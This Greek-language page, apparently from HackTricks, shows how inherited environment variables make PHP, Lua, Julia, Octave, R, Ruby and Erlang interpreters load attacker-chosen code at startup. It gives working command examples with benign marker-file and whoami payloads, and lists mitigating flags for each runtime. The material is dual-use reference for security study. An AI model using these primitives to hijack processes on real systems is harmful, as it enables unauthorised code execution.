# Εισαγωγή κατά την εκκίνηση του διερμηνευτή macOS μέσω μεταβλητών περιβάλλοντος

{{#include ../../../banners/hacktricks-training.md}}

Αυτές οι τεχνικές, ειδικές για κάθε runtime, χρησιμοποιούν μεταβλητές περιβάλλοντος που κληρονομούνται, για να επιλέξουν ρυθμίσεις εκκίνησης, να προφορτώσουν κώδικα ή να παρέχουν σημαίες VM πριν από την προβλεπόμενη εργασία. Ορισμένες παραλλαγές βασίζονται σε αρχεία· η Lua και η Erlang υποστηρίζουν επίσης εκτέλεση ενσωματωμένου κώδικα.

## Ρυθμίσεις εκκίνησης PHP

### `PHPRC` / `PHP_INI_SCAN_DIR` και `auto_prepend_file`

Η PHP CLI και CGI διαβάζουν τις ρυθμίσεις σε κάθε κλήση. Η `PHPRC` μπορεί να επιλέξει ένα `php.ini` που είναι αναγνώσιμο από τον επιτιθέμενο, ενώ η `PHP_INI_SCAN_DIR` μπορεί να ανακατευθύνει τον κατάλογο στον οποίο γίνεται σάρωση για πρόσθετα αρχεία `.ini`. Η οδηγία `auto_prepend_file` κάνει την PHP να αναλύσει ένα αρχείο πριν από το ζητούμενο script, επομένως αυτός ο συνδυασμός επιτρέπει την εκτέλεση κώδικα κατά την εκκίνηση.<sup>[[1]](#references)[[2]](#references)</sup>

```bash
cat >/tmp/php-payload.php <<'PHP'
<?php file_put_contents('/tmp/php-prepend-executed', 'ok'); ?>
PHP
echo 'auto_prepend_file=/tmp/php-payload.php' >/tmp/attacker-php.ini

PHPRC=/tmp/attacker-php.ini php victim.php
```

Μια εναλλακτική είναι ένας κατάλογος που περιέχει ένα αρχείο `.ini`:

```bash
mkdir -p /tmp/php-conf.d
echo 'auto_prepend_file=/tmp/php-payload.php' >/tmp/php-conf.d/99-prepend.ini
PHP_INI_SCAN_DIR=/tmp/php-conf.d php victim.php
```

Η επιλογή `-n` αγνοεί το `php.ini`· μια ρητή, έμπιστη διαδρομή `-c` υπερισχύει του `PHPRC`. Να θυμάστε ότι ένα SAPI διακομιστή μακράς διάρκειας συνήθως διαβάζει τις ρυθμίσεις κατά την εκκίνηση του web server, ενώ το CLI και το CGI το κάνουν σε κάθε κλήση.<sup>[[1]](#references)</sup>

## Κώδικας εκκίνησης Lua

### `LUA_INIT`

Πριν από την επεξεργασία των επιλογών της γραμμής εντολών ή του script-στόχου, ο αυτόνομος διερμηνευτής Lua εκτελεί το `LUA_INIT_<major>_<minor>` ή, αν η μεταβλητή με την έκδοση δεν έχει οριστεί, το `LUA_INIT`. Μια τιμή που αρχίζει με `@` καθορίζει ένα αρχείο· κάθε άλλη τιμή αξιολογείται απευθείας ως κώδικας Lua. Έτσι, είναι δυνατή η εκτέλεση κατά την εκκίνηση τόσο μέσω αρχείου όσο και χωρίς αρχείο.<sup>[[3]](#references)</sup>

```bash
# File-backed
echo 'os.execute("touch /tmp/lua-init-executed")' >/tmp/lua-init.lua
LUA_INIT_5_4=@/tmp/lua-init.lua lua victim.lua

# Fileless
LUA_INIT='os.execute("touch /tmp/lua-inline-executed")' lua victim.lua
```

Το ακριβές όνομα με έκδοση αλλάζει ανάλογα με τον interpreter, για παράδειγμα `LUA_INIT_5_4`. Η εντολή `lua -E` αγνοεί όλες τις μεταβλητές περιβάλλοντος, συμπεριλαμβανομένου του κώδικα εκκίνησης και των διαδρομών των Lua modules.

## Depot εκκίνησης του Julia

### `JULIA_DEPOT_PATH` και `startup.jl`

Κανονικά, το Julia εκτελεί το `config/startup.jl` από το πρώτο του depot κατά την εκκίνηση. Το `JULIA_DEPOT_PATH` ελέγχει τη λίστα των depot, επομένως, αν το δείξετε σε ένα δέντρο στο οποίο μπορεί να γράψει ο attacker, ανακατευθύνεται το αρχείο εκκίνησης που φορτώνεται αυτόματα.<sup>[[4]](#references)[[5]](#references)</sup>

```bash
mkdir -p /tmp/julia-depot/config
echo 'run(`touch /tmp/julia-startup-executed`)' >/tmp/julia-depot/config/startup.jl

# A trailing empty entry expands to Julia's default depots.
JULIA_DEPOT_PATH=/tmp/julia-depot: julia victim.jl
```

Ο τελικός διαχωριστής είναι χρήσιμος όταν το θύμα εξακολουθεί να χρειάζεται τα κανονικά του πακέτα. Το `julia --startup-file=no` απενεργοποιεί αυτό το αρχείο εκκίνησης. Διαγράψτε τη μεταβλητή πριν από την εκκίνηση, επειδή ελέγχει επίσης τα μητρώα πακέτων, τα περιβάλλοντα, τις cache και τις τοποθεσίες φόρτωσης κώδικα.

## Αρχεία εκκίνησης του GNU Octave

### `OCTAVE_SITE_INITFILE` / `OCTAVE_VERSION_INITFILE`

Το GNU Octave εκτελεί κατά την εκκίνηση αρκετά αρχεία που περιέχουν έγκυρες εντολές Octave. Το `OCTAVE_SITE_INITFILE` παρακάμπτει το αρχείο εκκίνησης για ολόκληρο τον ιστότοπο και το `OCTAVE_VERSION_INITFILE` παρακάμπτει το αρχείο που αφορά τη συγκεκριμένη έκδοση, επιτρέποντας σε οποιαδήποτε από τις δύο μεταβλητές να ανακατευθύνει την αυτόματη εκτέλεση σε ένα αρχείο αναγνώσιμο από τον attacker.<sup>[[6]](#references)</sup>

```bash
cat >/tmp/octave-startup.m <<'OCTAVE'
system('touch /tmp/octave-startup-executed');
OCTAVE

OCTAVE_SITE_INITFILE=/tmp/octave-startup.m octave-cli --quiet victim.m
```

`--no-init-file` παραλείπει μόνο αρχεία χρήστη, όπως το `~/.octaverc`· **δεν** σταματά την παραπάνω παράκαμψη του αρχείου site. Χρησιμοποιήστε το `--no-site-file` για τα αρχεία site ή το `--norc` / `-f` για να απενεργοποιήσετε όλα τα αρχεία εκκίνησης.<sup>[[7]](#references)</sup>

## Προφίλ εκκίνησης του R και φόρτωση πακέτων

### `R_PROFILE_USER` / `R_PROFILE`

Κατά την εκκίνηση, το R φορτώνει αρχεία προφίλ site και χρήστη που περιέχουν κώδικα R. Το `R_PROFILE` επιλέγει το προφίλ site και το `R_PROFILE_USER` επιλέγει το προφίλ χρήστη, επιτρέποντας σε ένα περιβάλλον που έχει κληρονομηθεί να ανακατευθύνει οποιαδήποτε από τις δύο αναζητήσεις σε αρχείο αναγνώσιμο από τον attacker.<sup>[[8]](#references)</sup>

```bash
echo 'file.create("/tmp/r-profile-executed")' >/tmp/attacker.Rprofile
R_PROFILE_USER=/tmp/attacker.Rprofile Rscript victim.R
```

`--no-init-file` παραλείπει το προφίλ χρήστη, το `--no-site-file` παραλείπει το προφίλ site και το `--vanilla` περιλαμβάνει και τις δύο προστασίες. Το R επεξεργάζεται πρώτα τα αρχεία περιβάλλοντος που επιλέγονται από τα `R_ENVIRON` και `R_ENVIRON_USER`, αλλά αυτά τα αρχεία ορίζουν μόνο μεταβλητές· οι μεταβλητές προφίλ αποτελούν το άμεσο primitive εκτέλεσης αυθαίρετου κώδικα.

### `R_DEFAULT_PACKAGES` / `R_SCRIPT_DEFAULT_PACKAGES` και διαδρομές βιβλιοθηκών

Το R προσαρτά κατά την εκκίνηση τα πακέτα, διαχωρισμένα με κόμμα, που ορίζονται στο `R_DEFAULT_PACKAGES`. Το `Rscript` δίνει προτεραιότητα στο `R_SCRIPT_DEFAULT_PACKAGES`. Ο συνδυασμός οποιασδήποτε από αυτές τις μεταβλητές με τις `R_LIBS`, `R_LIBS_USER` ή `R_LIBS_SITE` μπορεί να κάνει το R να εντοπίσει και να φορτώσει ένα εγκατεστημένο πακέτο που ελέγχεται από attacker· το hook `.onLoad` ή `.onAttach` εκτελείται αυτόματα.<sup>[[8]](#references)[[9]](#references)</sup>

```bash
# Assume an installed package named htpayload exists below /tmp/r-library.
R_LIBS_USER=/tmp/r-library \
R_DEFAULT_PACKAGES=htpayload \
R --no-save --no-restore --silent

R_LIBS_USER=/tmp/r-library \
R_SCRIPT_DEFAULT_PACKAGES=htpayload \
Rscript victim.R
```

Αυτό απαιτεί ένα δομικά έγκυρο εγκατεστημένο R package, όχι απλώς ένα μεμονωμένο αρχείο `.R`. Το `--vanilla` δεν εκκαθαρίζει τις άμεσα κληρονομημένες μεταβλητές, επομένως ένα έμπιστο wrapper πρέπει να αναιρεί ή να αντικαθιστά τις μεταβλητές default-package και library-path, καθώς και να απενεργοποιεί τα αρχεία profile.

## Επιλογές φορτωτή Ruby

### RUBYOPT

Το Ruby αναλύει τις υποστηριζόμενες επιλογές γραμμής εντολών από τη μεταβλητή περιβάλλοντος `RUBYOPT` πριν εκτελέσει ένα script. Το Ruby απορρίπτει την εκτέλεση κώδικα μέσω του `-e` στο `RUBYOPT`, αλλά το `-I` μπορεί να προσθέσει έναν κατάλογο στην αρχή της διαδρομής αναζήτησης βιβλιοθηκών και το `-r` μπορεί να απαιτήσει μια βιβλιοθήκη. Συνεπώς, μια διεργασία που εκκινεί το Ruby με μεταβλητές περιβάλλοντος ελεγχόμενες από attacker μπορεί να εξαναγκαστεί να φορτώσει κώδικα Ruby που ελέγχεται από attacker.<sup>[[10]](#references)</sup>

Δημιουργήστε το `/tmp/inject.rb`:

```ruby:inject.rb
puts `whoami`
```

Δημιουργήστε ένα ακίνδυνο Ruby script, όπως το `hello.rb`:

```ruby:hello.rb
puts 'Hello, World!'
```

Εκτελέστε το με μια ελεγχόμενη τιμή `RUBYOPT`:

```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb
```

Για να απενεργοποιήσετε αυτή τη συμπεριφορά, περάστε το `--disable=rubyopt` (ή `--disable-rubyopt`) **πριν** από το όνομα του script:<sup>[[10]](#references)</sup>

```bash
RUBYOPT="-I/tmp -rinject" ruby --disable=rubyopt hello.rb
```

Μια επιλογή που γράφεται μετά το `hello.rb` περνά στο script μέσω του `ARGV`· δεν απενεργοποιεί την προηγούμενη επεξεργασία του `RUBYOPT` από τη Ruby.<sup>[[10]](#references)</sup>

```bash
# This still loads /tmp/inject.rb because --disable-rubyopt is an argument to hello.rb.
RUBYOPT="-I/tmp -rinject" ruby hello.rb --disable-rubyopt
```

### RUBYLIB

Αντί να προσθέτει τον κατάλογο φόρτωσης στην αρχή με `-I` μέσα στο `RUBYOPT`, η ξεχωριστή μεταβλητή περιβάλλοντος `RUBYLIB` προσθέτει καταλόγους στο `$LOAD_PATH` του Ruby. Σε συνδυασμό με το `RUBYOPT=-r<module>`, φορτώνει κώδικα του επιτιθέμενου χωρίς να χρειάζεται το `-I` στο `RUBYOPT`:<sup>[[10]](#references)</sup>

```bash
echo "puts \`whoami\`" > /tmp/inject.rb
RUBYLIB=/tmp RUBYOPT=-rinject ruby hello.rb
```

## Σημαίες VM των Erlang και Elixir

### `ERL_AFLAGS`, `ERL_FLAGS` και `ERL_ZFLAGS`

Ο εκκινητής `erl` προσθέτει το `ERL_AFLAGS` στην αρχή της γραμμής εντολών και τα `ERL_FLAGS` / `ERL_ZFLAGS` στο τέλος. Επειδή το `-eval` αξιολογεί μια έκφραση Erlang κατά την αρχικοποίηση της VM, αυτές οι μεταβλητές μπορούν να επιτρέψουν εκτέλεση κώδικα χωρίς αρχεία πριν από το προβλεπόμενο workload.<sup>[[11]](#references)</sup>

```bash
ERL_AFLAGS="-noshell -eval 'file:write_file(\"/tmp/erl-aflags-executed\", <<\"ok\">>).' -s init stop" erl
```

Το Elixir, το Mix, το Phoenix και πολλές εκδόσεις του Elixir εκκινούν τελικά την Erlang VM και ενδέχεται να κληρονομούν αυτές τις flags. Επιβεβαιώστε το ακριβές release wrapper: μπορεί να αναδημιουργεί ή να καθαρίζει τα ορίσματα της VM, ενώ ορισμένα εργαλεία υποστηρίζουν ρητά τα `ERL_AFLAGS`, `ERL_ZFLAGS` ή `ELIXIR_ERL_OPTIONS`.<sup>[[12]](#references)</sup>

Σε αντίθεση με τις περισσότερες τεχνικές που βασίζονται σε αρχεία, το payload του `-eval` δεν χρειάζεται αρχείο ελεγχόμενο από τον επιτιθέμενο. Ένα έμπιστο wrapper πρέπει να καθαρίζει και τις τρεις μεταβλητές flags της Erlang (και την `ELIXIR_ERL_OPTIONS` για το Elixir) πριν από την εκκίνηση του runtime· μην επιχειρείτε να επιτρέψετε μεμονωμένες VM flags, εκτός αν κατανοείτε πλήρως τον parser και τη σειρά τους.

## References

- [1] [Αρχείο ρυθμίσεων PHP](https://www.php.net/manual/en/configuration.file.php)
- [2] [PHP `auto_prepend_file`](https://www.php.net/manual/en/ini.core.php#ini.auto-prepend-file)
- [3] [Αυτόνομος interpreter Lua 5.4](https://www.lua.org/manual/5.4/manual.html#7)
- [4] [Διεπαφή γραμμής εντολών της Julia: Αρχείο εκκίνησης](https://docs.julialang.org/en/v1/manual/command-line-interface/#Startup-file)
- [5] [Μεταβλητές περιβάλλοντος της Julia: `JULIA_DEPOT_PATH`](https://docs.julialang.org/en/v1/manual/environment-variables/#JULIA_DEPOT_PATH)
- [6] [Αρχεία εκκίνησης του GNU Octave](https://docs.octave.org/latest/Startup-Files.html)
- [7] [Επιλογές γραμμής εντολών του GNU Octave](https://docs.octave.org/latest/Command-Line-Options.html)
- [8] [Αρχικοποίηση κατά την εκκίνηση μιας συνεδρίας R](https://stat.ethz.ch/R-manual/R-devel/library/base/html/Startup.html)
- [9] [Εγκατάσταση και διαχείριση του R: Πρόσθετα πακέτα](https://stat.ethz.ch/CRAN/doc/manuals/r-release/R-admin.html)
- [10] [Τεκμηρίωση Ruby - Επιλογές γραμμής εντολών της Ruby](https://ruby-doc.org/3.4/ruby/options_md.html)
- [11] [Εντολή `erl` και μεταβλητές περιβάλλοντος](https://www.erlang.org/doc/apps/erts/erl_cmd.html)
- [12] [Εκδόσεις Elixir και επιλογές περιβάλλοντος της VM](https://hexdocs.pm/elixir/releases.html#operating-system-scripts)
{{#include ../../../banners/hacktricks-training.md}}
